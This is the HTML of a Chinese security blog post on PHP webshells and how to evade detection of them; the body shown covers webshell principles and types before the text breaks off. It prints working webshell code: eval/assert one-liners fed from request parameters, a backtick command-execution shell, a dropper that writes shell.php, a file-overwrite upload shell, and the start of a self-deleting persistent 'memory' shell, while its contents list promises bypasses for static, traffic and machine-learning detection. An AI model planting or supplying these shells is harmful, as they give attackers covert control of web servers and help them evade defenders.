<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/blog-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/blog-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic%7CRoboto+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"l0n9w4y.cc","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.13.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="本文研究PHP Webshell绕过类型、免杀技术与隐藏思路...">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP Webshell免杀与隐匿研究">
<meta property="og:url" content="https://l0n9w4y.cc/posts/19996/index.html">
<meta property="og:site_name" content="L0n9w4y">
<meta property="og:description" content="本文研究PHP Webshell绕过类型、免杀技术与隐藏思路...">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lcx.cc/file/old/1722_1.png">
<meta property="article:published_time" content="2021-06-02T12:55:12.000Z">
<meta property="article:modified_time" content="2022-09-12T13:23:12.199Z">
<meta property="article:author" content="L0n9w4y">
<meta property="article:tag" content="Malware">
<meta property="article:tag" content="Webshell">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lcx.cc/file/old/1722_1.png">


<link rel="canonical" href="https://l0n9w4y.cc/posts/19996/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://l0n9w4y.cc/posts/19996/","path":"posts/19996/","title":"PHP Webshell免杀与隐匿研究"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>PHP Webshell免杀与隐匿研究 | L0n9w4y</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">L0n9w4y</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-攻防"><a href="/security/" rel="section"><i class="fa fa-navicon fa-fw"></i>攻防</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Webshell%E5%8E%9F%E7%90%86"><span class="nav-text">0x01 Webshell原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%AE%9A%E4%B9%89"><span class="nav-text">1.定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%BB%84%E6%88%90"><span class="nav-text">2. 组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%8F%98%E5%BD%A2%E6%80%9D%E8%B7%AF"><span class="nav-text">3. 变形思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Webshell%E7%B1%BB%E5%9E%8B"><span class="nav-text">0x02 Webshell类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-text">1. 一句话木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%B0%8F%E9%A9%AC"><span class="nav-text">2. 小马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%A4%A7%E9%A9%AC"><span class="nav-text">3. 大马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">4. 内存马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E8%87%AA%E5%88%A0%E9%99%A4%E6%9C%A8%E9%A9%AC"><span class="nav-text">5. 自删除木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E8%A0%95%E8%99%AB%E9%A9%AC"><span class="nav-text">6. 蠕虫马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="nav-text">0x03 命令执行方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C"><span class="nav-text">1. 直接执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="nav-text">2. 动态函数执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%89%A7%E8%A1%8C"><span class="nav-text">3. 文件包含执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="nav-text">4. 回调函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-PHP-Curly-Syntax"><span class="nav-text">5. PHP Curly Syntax</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">6. php反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-php-x2F-x2F-input%E6%96%B9%E6%B3%95"><span class="nav-text">7. php:&#x2F;&#x2F;input方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-preg-replace%E6%96%B9%E6%B3%95"><span class="nav-text">8. preg_replace方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-ob-start%E5%87%BD%E6%95%B0"><span class="nav-text">9. ob_start函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%98%E7%A7%8D%E4%B8%8E%E9%9A%90%E8%97%8F"><span class="nav-text">0x04 变种与隐藏</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-php-ini%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8"><span class="nav-text">1. php.ini隐藏后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-htaccess%E6%96%87%E4%BB%B6PHP%E5%90%8E%E9%97%A8"><span class="nav-text">2. .htaccess文件PHP后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-user-ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8"><span class="nav-text">3. .user.ini文件构成的PHP后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%88%A9%E7%94%A8PHP%E5%8A%A8%E6%80%81%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7"><span class="nav-text">4. 利用PHP动态变量特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-tiny-php-shell"><span class="nav-text">5. tiny php shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E6%97%A0%E5%AD%97%E6%AF%8D-webshell"><span class="nav-text">6. 无字母 webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC"><span class="nav-text">7. 图片木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5-PHP%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="nav-text">8. 字符串拼接+PHP动态函数执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-Curly-Syntax"><span class="nav-text">9. Curly Syntax</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-LFI%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">10. LFI导致的代码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11-PHP%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BA%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0-Lamda%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">11. PHP动态创建匿名函数(Lamda表达式)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E8%BE%93%E5%87%BA%E7%BC%93%E5%AD%98"><span class="nav-text">12. 利用系统输出缓存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#13-%E5%88%A9%E7%94%A8assert-%E6%96%AD%E8%A8%80"><span class="nav-text">13. 利用assert()断言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#14-%E6%95%B0%E7%BB%84%E6%98%A0%E5%B0%84%E7%B1%BB%E5%9E%8B%E5%87%BD%E6%95%B0%E5%A4%84%E7%90%86%E5%90%8E%E7%9A%84%E5%9B%9E%E8%B0%83%E6%9C%BA%E5%88%B6"><span class="nav-text">14. 数组映射类型函数处理后的回调机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#15-PHP%E5%BA%8F%E5%88%97%E5%8C%96-x2F-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%89%B9%E6%80%A7%E5%B8%83%E7%BD%AE%E5%90%8E%E9%97%A8"><span class="nav-text">15. PHP序列化&#x2F;反序列化特性布置后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#16-%E4%BD%BF%E7%94%A8HTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E8%BF%9B%E8%A1%8C%E6%8C%87%E4%BB%A4%E4%BC%A0%E8%BE%93"><span class="nav-text">16. 使用HTTP头部字段进行指令传输</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#17-%E4%B9%B1%E5%BA%8F%E6%8B%BC%E6%8E%A5%E6%B3%95"><span class="nav-text">17. 乱序拼接法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#18-PHP%E7%AE%A1%E9%81%93%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8"><span class="nav-text">18. PHP管道技术利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#19-PHP%E6%8C%87%E4%BB%A4%E6%9B%BF%E6%8D%A2"><span class="nav-text">19. PHP指令替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#20-%E5%9F%BA%E4%BA%8E%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E9%9D%9E%E5%8F%AF%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E9%83%A8%E7%BD%B2PHP%E6%9C%A8%E9%A9%AC"><span class="nav-text">20. 基于图片文件非可显示字段部署PHP木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#21-%E6%B3%A8%E9%87%8A-%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="nav-text">21. 注释+反射机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22-%E8%87%AA%E6%AF%81%E6%80%A7Webshell"><span class="nav-text">22. 自毁性Webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#23-%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E5%8F%98%E9%87%8F%E6%B3%A8%E5%86%8C%E6%8A%80%E6%9C%AF"><span class="nav-text">23. 利用本地变量注册技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#24-%E5%88%A9%E7%94%A8ReflectionFunction%E5%8F%8D%E5%B0%84"><span class="nav-text">24. 利用ReflectionFunction反射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#25-%E5%88%A9%E7%94%A8PHP%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="nav-text">25. 利用PHP自定义函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#26-%E9%98%B2%E7%AF%A1%E6%94%B9WEBSHELL"><span class="nav-text">26. 防篡改WEBSHELL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#27-%E5%88%A9%E7%94%A8session-set-save-handler-callback"><span class="nav-text">27. 利用session_set_save_handler callback</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#28-%E5%88%A9%E7%94%A8include%E3%80%81pack%E9%9A%90%E8%97%8Fwebshell"><span class="nav-text">28. 利用include、pack隐藏webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#29-%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6-include"><span class="nav-text">29. 临时文件 + include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#30-%E5%88%A9%E7%94%A8filter-var-callback%E7%89%B9%E6%80%A7"><span class="nav-text">30. 利用filter_var callback特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#31-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="nav-text">31. 数据库回调后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#32-%E5%88%A9%E7%94%A8php-memcached%E6%89%A7%E8%A1%8Cwebshell"><span class="nav-text">32. 利用php_memcached执行webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#33-%E5%88%A9%E7%94%A8preg-replace-callback%E9%9A%90%E8%97%8Fwebshell"><span class="nav-text">33. 利用preg_replace_callback隐藏webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#34-%E5%88%A9%E7%94%A8CallbackFilterIterator%E9%83%A8%E7%BD%B2%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8"><span class="nav-text">34. 利用CallbackFilterIterator部署回调后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#35-PHP%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="nav-text">35. PHP无文件后门</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="nav-text">0x05 绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%BB%95%E8%BF%87%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B"><span class="nav-text">1. 绕过静态检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86"><span class="nav-text">a. 字符串处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-%E5%85%B3%E9%94%AE%E8%AF%8D%E5%A4%84%E7%90%86"><span class="nav-text">b. 关键词处理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#c-%E6%95%B0%E7%BB%84%E5%88%A9%E7%94%A8"><span class="nav-text">c. 数组利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#d-%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8"><span class="nav-text">d. 函数利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#e-%E7%B1%BB%E8%B0%83%E7%94%A8"><span class="nav-text">e. 类调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#f-%E6%96%87%E4%BB%B6%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86"><span class="nav-text">f. 文件混淆加密</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%BB%95%E8%BF%87%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B"><span class="nav-text">2. 绕过流量检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-RSA%E5%8A%A0%E5%AF%86"><span class="nav-text">a. RSA加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-AES%E5%8A%A0%E5%AF%86"><span class="nav-text">b. AES加密</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%BB%95%E8%BF%87%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%E6%A3%80%E6%B5%8B"><span class="nav-text">3. 绕过机器学习算法检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#a-%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6"><span class="nav-text">a. 加密文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#b-%E6%A8%A1%E6%8B%9F%E6%AD%A3%E5%B8%B8%E4%B8%9A%E5%8A%A1%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91"><span class="nav-text">b. 模拟正常业务代码逻辑</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#c-%E5%8C%BF%E5%90%8D%E5%8C%96%E6%94%BB%E5%87%BB"><span class="nav-text">c. 匿名化攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#d-%E4%BD%BF%E7%94%A8%E6%B3%A8%E9%87%8A"><span class="nav-text">d. 使用注释</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-Reference"><span class="nav-text">0xFF Reference</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="L0n9w4y"
      src="/images/hexo.png">
  <p class="site-author-name" itemprop="name">L0n9w4y</p>
  <div class="site-description" itemprop="description">攻防对抗，問道遠兮，求索未止...</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">36</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">35</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/L0n9w4y" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;L0n9w4y" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/l0n9w4y" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;l0n9w4y" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/_L0n9_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;_L0n9_" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://l0n9w4y.cc/posts/19996/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hexo.png">
      <meta itemprop="name" content="L0n9w4y">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="L0n9w4y">
      <meta itemprop="description" content="攻防对抗，問道遠兮，求索未止...">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="PHP Webshell免杀与隐匿研究 | L0n9w4y">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          PHP Webshell免杀与隐匿研究
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-06-02 20:55:12" itemprop="dateCreated datePublished" datetime="2021-06-02T20:55:12+08:00">2021-06-02</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%AF%B9%E6%8A%97/" itemprop="url" rel="index"><span itemprop="name">样本对抗</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <center>本文研究PHP Webshell绕过类型、免杀技术与隐藏思路...</center>

<span id="more"></span>

<h2 id="0x01-Webshell原理"><a href="#0x01-Webshell原理" class="headerlink" title="0x01 Webshell原理"></a>0x01 Webshell原理</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><p>WebShell是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以称做为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后通过浏览器来访问这些asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载文件，查看数据库，执行任意程序命令等）</p>
<h3 id="2-组成"><a href="#2-组成" class="headerlink" title="2. 组成"></a>2. 组成</h3><p><img src="https://lcx.cc/file/old/1722_1.png"></p>
<p>结构：数据传递 + 数据执行</p>
<h3 id="3-变形思路"><a href="#3-变形思路" class="headerlink" title="3. 变形思路"></a>3. 变形思路</h3><pre class="language-none"><code class="language-none">1. 数据传递:
　　1) $_GET、$_POST、$_COOKIES、$_FILE...(HTTP包中的任何位置都可以作为payload的传输媒介)
　　2) 从远程远程URL中获取数据: file_get_contents、curl、svn_checkout...(将需要执行的指令数据放在远程URL中，通过URL_INCLUDE来读取)
　　3) 从磁盘文件中获取数据: file、file_get_contents...(将需要执行的指令数据放在磁盘文件中，利用IO函数来读取)
　　4) 从数据库中读取(将需要执行的指令放在数据库中，利用数据库函数来读取)
　　5) 从图片头部中获取: exif_read_data...(将需要执行的指令数据放在图片头部中，利用图片操作函数来读取)

2. 代码执行(执行用户传输的数据)
　　1) eva、system...l执行(这是最普通、标准的代码执行)
　　2) LFI: include、require...(利用浏览器的伪协议将文件包含转化为代码执行)
　　3) 动态函数执行($()...PHP的动态函数特性)
　　4) Curly Syntax($&#123;$&#123;...&#125;&#125;...把变量赋值的漏洞转化为代码执行)</code></pre>

<h2 id="0x02-Webshell类型"><a href="#0x02-Webshell类型" class="headerlink" title="0x02 Webshell类型"></a>0x02 Webshell类型</h2><h3 id="1-一句话木马"><a href="#1-一句话木马" class="headerlink" title="1. 一句话木马"></a>1. 一句话木马</h3><p>最常见一句话木马</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 通过 eval&#x2F;assert 等能够将字符串作为php代码执行的能力，将 $_POST&#x2F;$_REQUEST&#x2F;$_GET 中传递的字符串作为PHP代码执行

&lt;?php @eval($_POST[&#39;hack&#39;]); ?&gt;
&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;</code></pre>

<p>最短一句话，使用反引号无回显执行命令</p>
<pre class="language-none"><code class="language-none">&lt;?&#x3D;&#96;$_GET[1]&#96;;</code></pre>

<h3 id="2-小马"><a href="#2-小马" class="headerlink" title="2. 小马"></a>2. 小马</h3><p>通过较少的代码，用于完成写入文件、列出目录、查看文件、执行一些系统命令等少量功能的 Webshell</p>
<p><strong>写文件小马</strong></p>
<pre class="language-none"><code class="language-none">
&lt;?php
$test&#x3D;&#39;&lt;?php $a&#x3D;$_POST[&quot;cmd&quot;];assert($a); ?&gt;&#39;;
file_put_contents(&quot;shell.php&quot;, $test);
?&gt;</code></pre>

<p><strong>文件上传马</strong></p>
<pre class="language-none"><code class="language-none">&lt;?php
header(&quot;content-Type: text&#x2F;html; charset&#x3D;utf-8&quot;);
?&gt;
&lt;? 
echo
&quot;&lt;&#x2F;br&gt;获取服务器IP地址: &quot;.$_SERVER[&#39;HTTP_HOST&#39;].
&quot;&lt;&#x2F;br&gt;获取服务信息: &quot;.apache_get_version();
?&gt;
&lt;form method&#x3D;&quot;POST&quot;&gt;&lt;&#x2F;br&gt;
shell路径: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;file&quot; size&#x3D;&quot;60&quot; value&#x3D;&quot;&lt;? echo str_replace(&#39;\&#39;,&#39;&#x2F;&#39;,__FILE__) ?&gt;&quot;&gt;
&lt;br&gt;&lt;br&gt;
&lt;textarea name&#x3D;&quot;text&quot; COLS&#x3D;&quot;70&quot; ROWS&#x3D;&quot;18&quot; &gt;&lt;&#x2F;textarea&gt;
&lt;br&gt;&lt;br&gt;
&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;保存&quot;&gt; 
&lt;form&gt;
&lt;?php
error_reporting(0);
if ($_POST)&#123;
  $f&#x3D;fopen($_POST[&quot;file&quot;],&quot;w&quot;);
  echo   fwrite($f,$_POST[&quot;text&quot;])? &#39;保存成功!&#39; : &#39;保存失败!&#39;;
&#125;
?&gt;</code></pre>

<h3 id="3-大马"><a href="#3-大马" class="headerlink" title="3. 大马"></a>3. 大马</h3><p>PHP大马就是功能较全，支持各种在渗透过程中可能用到的各种功能的大型代码集合，通常具有文件管理、命令执行、端口扫描、数据库管理、反弹shell等等的功能</p>
<p>如：adminer、phpspy 等</p>
<h3 id="4-内存马"><a href="#4-内存马" class="headerlink" title="4. 内存马"></a>4. 内存马</h3><p>内存马，又称不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 通过死循环创建webshell文件

&lt;?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file &#x3D; &#39;2.php&#39;;
